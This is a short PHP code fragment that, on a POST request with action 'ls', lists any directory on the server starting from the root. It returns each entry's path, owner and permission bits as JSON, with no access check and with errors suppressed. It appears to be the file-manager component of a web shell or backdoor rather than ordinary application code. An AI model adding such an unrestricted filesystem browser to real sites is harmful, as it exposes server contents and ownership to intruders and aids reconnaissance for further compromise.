if (isset($_POST['action']) && $_POST['action'] === 'ls') {
ob_end_clean();
header('Content-Type: application/json');
$d = $_POST['dir'] ?? '/';
if (!is_dir($d)) $d = '/';
$d = realpath($d) ?: $d;
$entries = [];
foreach (@scandir($d) ?: [] as $name) {
$full = $d . '/' . $name;
$real = realpath($full);
if ($real === false) continue;
$isDir = is_dir($real);
$owner = '?';
if (function_exists('posix_getpwuid')) {
$info = @posix_getpwuid(@fileowner($full));
if ($info) $owner = $info['name'];
}
$mode = @fileperms($full);
$entries[] = ['name'=>$name,'path'=>$real,'dir'=>$isDir,'owner'=>$owner,'perms'=>decoct($mode & 0777)];
}
echo json_encode(['dir'=>$d,'entries'=>$entries]);
exit;
}
